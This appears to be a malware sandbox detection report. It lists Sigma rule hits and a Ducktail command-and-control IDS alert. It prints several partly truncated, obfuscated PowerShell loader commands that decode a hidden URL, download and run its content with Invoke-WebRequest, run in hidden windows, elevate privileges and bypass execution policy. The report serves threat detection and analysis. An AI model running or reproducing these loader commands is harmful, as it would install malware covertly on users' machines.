sigma_analysis_results.rule_description: Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation

match_context.values: @{ScriptBlockText=$data = ([Text.Encoding]::UTF8.GetString((&("{0}{1}{2}" -f [char]((159 - 86)),[char]((47 + 40)),[char]((98 - 16))) (-join ([regex]::Matches("372B2B2F6570702C37363E2B2C2A723A3C372B713133702B706F6C3A3E6C3C3A6A6C3C393A3C3B67696F396E3A6D3E393E3C6D6C696A3B683E3B6D3D69696B6E3B6C676E6C68396B3D3A3C3B663D3A3D673D3A3C3D6A6D6C6D6F673C6D683C6F673C6F676D3D6F3C6F6F3C3B666869393C3E396C676B393A66", "..") | % { [char]([convert]::ToByte($_.Value, (107 - 91)) -bxor (140 - 45)) })) -UseBasicParsing).Content.ForEach [TRUNCATED]; MessageTotal=1; ScriptBlockId=53f03c6a-2f90-446e-a01f-bf51e4873360; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

match_context.values: @{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc  [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -w hidden -Command "$DatA = ([TExt.ENCoDiNG]::UTF8.GeTStRInG((&(\"{0}{1}{2}\" -f [CHAR]((149 - 76)),[ChAR]((162 - 75)),[CHAR]((138 - 56))) (-join ([regex]::Matches(\"3A26262221687D7D213A3B332621277F37313A267C3C3E7D267D343062616337676364656B3461366A3165676B34366037656A6A6B66656465336B6A3762613365333733306366316B336065316A3163626A36366A6731626261\", \"..\") | %% { [char]([convert]::ToByte($_.Value, (27 - 11)) -bxor (0 + 82)) }) [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$DatA = ([TExt.ENCoDiNG]::UTF8.GeTStRInG((&(\"{0}{1}{2}\" -f [CHAR]((149 - 76)),[ChAR]((162 - 75)),[CHAR]((138 - 56))) (-join ([regex]::Matches(\"3A26262221687D7D213A3B332621277F37313A267C3C3E7D267D343062616337676364656B3461366A3165676B34366037656A6A6B66656465336B6A3762613365333733306366316B336065316A3163626A36366A6731626261\", \"..\") | % { [char]([convert]::ToByte($_.Value, (27 - 11)) -b [TRUNCATED]; Path=; ScriptBlockId=fd2560e6-5a3f-4a78-9bc0-c6ae03587ae3; MessageTotal=1; EventID=4104; MessageNumber=1}

Start-Process "cmd.exe" -Verb runas -WindowStyle hidden -ArgumentList ("/c start /min """" powershell.exe -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand JABkAGEAdABhACAAPQAgACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAgAFsAYwBoAGEAcgBdACgAKAAxADUAOQAgAC0AIAA4ADYAKQApACwAWwBjAGgAYQByAF0AKAAoADQANwAgACsAIAA0ADAAKQAp [TRUNCATED]; MessageTotal=1; ScriptBlockId=dc51488e-7d4e-48c1-ba2d-3237011815d8; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.
Get the processes that are running on the local computer.

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=ca23cd53-1678-462e-8aec-5d0d9a225c12; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=ce42389e-12db-4ce1-8db4-7bb7838ce6a0; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=f3c32856-508a-4b2c-95cc-ff5b69f2ccaa; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=8ff480d1-e464-4970-aa98-4e3d3f1b0177; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=d1f81b23-0c60-4f9e-bec5-dee6ca98cc8b; MessageTotal=1; EventID=4104; MessageNumber=1}

crowdsourced_ids_results.rule_msg: ET MALWARE Ducktail CnC Activity - Begin Download Command (POST)
